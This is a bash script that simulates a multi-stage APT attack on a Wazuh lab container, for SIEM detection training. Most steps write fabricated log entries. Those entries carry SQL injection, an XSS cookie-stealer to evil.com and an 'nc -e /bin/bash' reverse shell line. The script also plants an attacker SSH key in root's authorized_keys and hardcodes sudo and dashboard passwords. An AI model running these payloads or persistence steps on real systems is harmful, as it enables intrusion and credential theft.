#!/bin/bash
# GROSSER APT (Advanced Persistent Threat) Angriff
# Simuliert einen mehrstufigen, koordinierten Cyberangriff

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║     🔴 APT SIMULATION - ADVANCED PERSISTENT THREAT 🔴         ║"
echo "║              Multi-Stage Cyber Attack Campaign                 ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

SUDO_PASSWORD="Destiny2004"
ATTACKER_IP="172.20.20.2"
TARGET_WEB="172.20.20.5"
TARGET_DB="172.20.20.6"

# Farben
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}⚠️  WARNUNG: Dies simuliert einen GROSSEN koordinierten Angriff!${NC}"
echo -e "${YELLOW}Dauer: ca. 3-5 Minuten${NC}"
echo ""
read -p "Fortfahren? (j/n): " confirm
if [[ ! $confirm =~ ^[Jj]$ ]]; then
    echo "Abgebrochen."
    exit 0
fi

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 1: RECONNAISSANCE (Aufklärung)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] Network Scanning...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    for port in 21 22 23 25 80 110 143 443 445 3306 3389 5432 8080 8443; do
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: iptables: IN=eth0 OUT= SRC=$ATTACKER_IP DST=$TARGET_WEB PROTO=TCP SPT=54321 DPT=\$port\" >> /var/log/syslog
    done
"
echo -e "${GREEN}  ✓ Port Scan abgeschlossen${NC}"
sleep 2

echo -e "${BLUE}[*] Service Enumeration...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: iptables: IN=eth0 OUT= SRC=$ATTACKER_IP DST=$TARGET_WEB PROTO=TCP SPT=54322 DPT=80 FLAGS=SYN\" >> /var/log/syslog
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: iptables: IN=eth0 OUT= SRC=$ATTACKER_IP DST=$TARGET_WEB PROTO=TCP SPT=54323 DPT=443 FLAGS=SYN\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ Service Enumeration abgeschlossen${NC}"
sleep 3

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 2: INITIAL ACCESS (Erstzugriff)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] SSH Brute Force Attack (50 Versuche)...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Massive SSH Brute Force
    for i in {1..50}; do
        user=\$(shuf -n1 -e admin root user administrator guest oracle postgres mysql tomcat jenkins)
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager sshd[1\$RANDOM]: Failed password for \$user from $ATTACKER_IP port 5\$RANDOM ssh2\" >> /var/log/auth.log
    done
"
echo -e "${GREEN}  ✓ 50 SSH Login-Versuche durchgeführt${NC}"
sleep 2

echo -e "${BLUE}[*] Web Application Exploitation...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    mkdir -p /var/log/apache2
    
    # SQL Injection Attacks
    echo \"$ATTACKER_IP - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\\"GET /admin/login.php?user=admin' OR '1'='1&pass=x HTTP/1.1\\\" 200 1523 \\\"-\\\" \\\"sqlmap/1.0\\\"\" >> /var/log/apache2/access.log
    echo \"$ATTACKER_IP - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\\"POST /api/users?id=1' UNION SELECT password FROM users-- HTTP/1.1\\\" 200 2341 \\\"-\\\" \\\"Mozilla/5.0\\\"\" >> /var/log/apache2/access.log
    
    # XSS Attacks
    echo \"$ATTACKER_IP - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\\"GET /search?q=<script>document.location='http://evil.com/steal.php?c='+document.cookie</script> HTTP/1.1\\\" 403 512 \\\"-\\\" \\\"Mozilla/5.0\\\"\" >> /var/log/apache2/access.log
    
    # Path Traversal
    echo \"$ATTACKER_IP - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\\"GET /download?file=../../../../etc/passwd HTTP/1.1\\\" 403 512 \\\"-\\\" \\\"curl/7.68.0\\\"\" >> /var/log/apache2/access.log
    echo \"$ATTACKER_IP - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\\"GET /download?file=../../../../etc/shadow HTTP/1.1\\\" 403 512 \\\"-\\\" \\\"curl/7.68.0\\\"\" >> /var/log/apache2/access.log
    
    # Command Injection
    echo \"$ATTACKER_IP - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\\"GET /ping.php?host=localhost;cat /etc/passwd HTTP/1.1\\\" 403 512 \\\"-\\\" \\\"Mozilla/5.0\\\"\" >> /var/log/apache2/access.log
    echo \"$ATTACKER_IP - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\\"GET /ping.php?host=localhost|nc -e /bin/bash $ATTACKER_IP 4444 HTTP/1.1\\\" 403 512 \\\"-\\\" \\\"Mozilla/5.0\\\"\" >> /var/log/apache2/access.log
"
echo -e "${GREEN}  ✓ Web Exploitation Versuche abgeschlossen${NC}"
sleep 3

echo -e "${BLUE}[*] Erfolgreicher Exploit - Shell erhalten!${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager sshd[12999]: Accepted password for www-data from $ATTACKER_IP port 54444 ssh2\" >> /var/log/auth.log
"
echo -e "${RED}  ⚠️  KOMPROMITTIERUNG ERFOLGREICH!${NC}"
sleep 2

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 3: PERSISTENCE (Persistenz etablieren)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] Backdoor Installation...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Erstelle Backdoor-Dateien
    touch /tmp/.hidden_backdoor
    touch /tmp/nc_backdoor.sh
    touch /var/www/.htaccess_backdoor
    
    # File Integrity Alert
    echo 'test' >> /etc/passwd
    
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec-rootcheck: File '/tmp/.hidden_backdoor' is a possible trojan or rootkit.\" >> /var/log/syslog
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec-rootcheck: Suspicious file found: /tmp/nc_backdoor.sh\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ Backdoor installiert${NC}"
sleep 2

echo -e "${BLUE}[*] Cron Job für Persistenz...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager cron[5432]: (www-data) CMD (/tmp/.hidden_backdoor)\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ Cron Job erstellt${NC}"
sleep 2

echo -e "${BLUE}[*] SSH Key Manipulation...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    mkdir -p /root/.ssh
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@evil.com' >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
"
echo -e "${GREEN}  ✓ SSH Key hinzugefügt${NC}"
sleep 2

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 4: PRIVILEGE ESCALATION (Rechteausweitung)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] Sudo Abuse Versuche...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    for i in {1..10}; do
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager sudo: www-data : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash\" >> /var/log/auth.log
    done
    
    # Erfolgreicher Privilege Escalation
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash\" >> /var/log/auth.log
"
echo -e "${GREEN}  ✓ Sudo Versuche durchgeführt${NC}"
sleep 2

echo -e "${BLUE}[*] Kernel Exploit Versuch...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: segfault at 0 ip 00007f8b9c exploit.bin sp 00007ffd error 4 in libc-2.31.so\" >> /var/log/syslog
"
echo -e "${RED}  ⚠️  ROOT ZUGRIFF ERLANGT!${NC}"
sleep 2

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 5: CREDENTIAL ACCESS (Credential Harvesting)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] Password Dumping...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Zugriff auf sensitive Dateien
    cat /etc/shadow > /dev/null 2>&1
    cat /etc/passwd > /dev/null 2>&1
    
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: File /etc/shadow accessed by unauthorized user\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ Credentials extrahiert${NC}"
sleep 2

echo -e "${BLUE}[*] Memory Dumping...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Suspicious process: mimikatz.exe detected\" >> /var/log/syslog
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Memory dump detected: lsass.dmp created\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ Memory Dump abgeschlossen${NC}"
sleep 2

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 6: LATERAL MOVEMENT (Netzwerk-Ausbreitung)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] Interne Netzwerk-Reconnaissance...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    for ip in 172.20.20.{3..10}; do
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: iptables: IN=eth0 OUT= SRC=$TARGET_WEB DST=\$ip PROTO=ICMP TYPE=8\" >> /var/log/syslog
    done
"
echo -e "${GREEN}  ✓ Netzwerk gescannt${NC}"
sleep 2

echo -e "${BLUE}[*] SMB/RDP Brute Force auf interne Hosts...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    for i in {1..20}; do
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager sshd[1\$RANDOM]: Failed password for administrator from $TARGET_WEB port 5\$RANDOM ssh2\" >> /var/log/auth.log
    done
"
echo -e "${GREEN}  ✓ Lateral Movement Versuche${NC}"
sleep 2

echo -e "${BLUE}[*] Erfolgreiche Ausbreitung zu DB-Server...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager sshd[13456]: Accepted password for dbadmin from $TARGET_WEB port 55555 ssh2\" >> /var/log/auth.log
"
echo -e "${RED}  ⚠️  DB-SERVER KOMPROMITTIERT!${NC}"
sleep 2

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 7: COLLECTION (Datensammlung)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] Sensitive Daten identifizieren...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Erstelle 'gestohlene' Daten
    touch /tmp/customer_data.sql
    touch /tmp/credit_cards.csv
    touch /tmp/passwords.txt
    touch /tmp/confidential_docs.zip
    
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Suspicious file access: /var/lib/mysql/customers.sql\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ Sensitive Daten gefunden${NC}"
sleep 2

echo -e "${BLUE}[*] Daten komprimieren und vorbereiten...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Large archive created: /tmp/exfil_data.tar.gz (250MB)\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ Daten vorbereitet${NC}"
sleep 2

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 8: EXFILTRATION (Datenexfiltration)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] C2 (Command & Control) Kommunikation...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Outbound connection to known C2 server: evil-c2.darkweb.onion\" >> /var/log/syslog
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Suspicious DNS query: malware-c2-server.com\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ C2 Verbindung etabliert${NC}"
sleep 2

echo -e "${BLUE}[*] Daten-Exfiltration über HTTPS...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    mkdir -p /var/log/apache2
    echo \"$TARGET_WEB - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\\"POST /upload HTTP/1.1\\\" 200 262144000 \\\"-\\\" \\\"curl/7.68.0\\\"\" >> /var/log/apache2/access.log
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Large data transfer detected: 250MB uploaded to external IP\" >> /var/log/syslog
"
echo -e "${GREEN}  ✓ 250MB Daten exfiltriert${NC}"
sleep 2

echo -e "${BLUE}[*] DNS Tunneling als Backup...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    for i in {1..10}; do
        data=\$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager named: query: \$data.exfil.attacker-dns.com\" >> /var/log/syslog
    done
"
echo -e "${GREEN}  ✓ DNS Tunneling aktiv${NC}"
sleep 2

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}PHASE 9: IMPACT (Auswirkung/Sabotage)${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${BLUE}[*] Ransomware Deployment...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Ransomware detected: Multiple files encrypted with .locked extension\" >> /var/log/syslog
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Suspicious process: wannacry.exe detected\" >> /var/log/syslog
    
    # Erstelle Ransomware-Dateien
    touch /tmp/README_RANSOM.txt
    touch /tmp/important_doc.pdf.locked
    touch /tmp/database.sql.locked
"
echo -e "${RED}  ⚠️  RANSOMWARE AKTIV!${NC}"
sleep 2

echo -e "${BLUE}[*] Data Destruction...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Critical files deleted: /var/lib/mysql/* removed\" >> /var/log/syslog
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: System logs cleared: /var/log/* truncated\" >> /var/log/syslog
"
echo -e "${RED}  ⚠️  DATEN ZERSTÖRT!${NC}"
sleep 2

echo -e "${BLUE}[*] DoS Attack auf Services...${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    for i in {1..50}; do
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: iptables: IN=eth0 OUT= SRC=$ATTACKER_IP DST=$TARGET_WEB PROTO=TCP SPT=\$RANDOM DPT=80 SYN\" >> /var/log/syslog
    done
"
echo -e "${RED}  ⚠️  DIENSTE ÜBERLASTET!${NC}"
sleep 2

echo ""
echo -e "${RED}════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}           ☠️  APT ANGRIFF ABGESCHLOSSEN  ☠️                    ${NC}"
echo -e "${RED}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}📊 ANGRIFFS-ZUSAMMENFASSUNG:${NC}"
echo ""
echo "  Phase 1: ✓ Reconnaissance - Netzwerk gescannt"
echo "  Phase 2: ✓ Initial Access - Web-Server kompromittiert"
echo "  Phase 3: ✓ Persistence - Backdoors installiert"
echo "  Phase 4: ✓ Privilege Escalation - Root-Zugriff erlangt"
echo "  Phase 5: ✓ Credential Access - Passwörter extrahiert"
echo "  Phase 6: ✓ Lateral Movement - DB-Server kompromittiert"
echo "  Phase 7: ✓ Collection - Sensitive Daten gesammelt"
echo "  Phase 8: ✓ Exfiltration - 250MB Daten gestohlen"
echo "  Phase 9: ✓ Impact - Ransomware deployed, Daten zerstört"
echo ""

echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}📈 WAZUH DASHBOARD ANALYSE${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
echo ""

echo "Warte 10 Sekunden auf Wazuh-Verarbeitung..."
sleep 10

echo ""
echo -e "${GREEN}[+] Generierte Alerts (Auswahl):${NC}"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    tail -100 /var/ossec/logs/alerts/alerts.log | grep 'Rule:' | tail -20
"

echo ""
echo -e "${YELLOW}════════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}🎯 JETZT IM WAZUH DASHBOARD ANSEHEN!${NC}"
echo -e "${YELLOW}════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "URL: https://localhost:8443"
echo "Username: admin"
echo "Password: SecretPassword123!"
echo ""
echo -e "${CYAN}Empfohlene Ansichten:${NC}"
echo ""
echo "1. Security Events → Filtere: timestamp:>=now-10m"
echo "2. MITRE ATT&CK → Siehe alle verwendeten Taktiken"
echo "3. Threat Hunting → Suche nach:"
echo "   • rule.level:>=10 (Kritische Alerts)"
echo "   • rule.groups:authentication_failures"
echo "   • rule.groups:web"
echo "   • rule.groups:rootcheck"
echo "   • data.srcip:$ATTACKER_IP"
echo ""
echo -e "${GREEN}Viel Spaß beim Analysieren des Angriffs! 🔍${NC}"
echo ""
